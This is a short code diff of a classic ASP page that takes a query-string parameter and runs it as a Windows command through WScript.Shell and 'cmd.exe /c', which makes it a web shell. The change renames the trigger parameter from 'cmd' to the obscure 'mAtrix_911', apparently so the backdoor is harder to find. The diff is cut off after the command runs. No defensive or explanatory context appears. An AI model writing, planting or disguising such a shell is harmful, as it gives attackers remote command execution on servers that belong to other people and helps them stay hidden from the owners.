@@ -1,6 +1,6 @@
 <%
 Dim cmd, oShell, oExec
-cmd = Request.QueryString("cmd")
+cmd = Request.QueryString("mAtrix_911")
 If cmd <> "" Then
     Set oShell = CreateObject("WScript.Shell")
     Set oExec  = oShell.Exec("cmd.exe /c " & cmd)
